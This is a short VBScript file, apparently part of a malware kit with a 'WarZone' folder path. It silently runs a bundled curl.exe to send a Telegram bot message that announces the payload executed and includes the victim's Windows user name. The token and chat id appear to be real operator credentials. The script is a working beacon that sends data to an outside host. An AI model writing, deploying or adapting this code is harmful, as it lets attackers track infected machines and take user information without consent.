set oShell = Wscript.CreateObject("Wscript.Shell")
oShell.Run "C:\Users\Public\WarZone\Main\curl.exe -k https://api.telegram.org/bot5158455501:AAE2unaiHyd7fBd5xDRy5yev4mlxt9z-A6M/sendMessage?chat_id=5176730926&text=%F0%9F%98%88Git%20Executed%0A--" + CreateObject("WScript.Network").UserName + "--",0,True
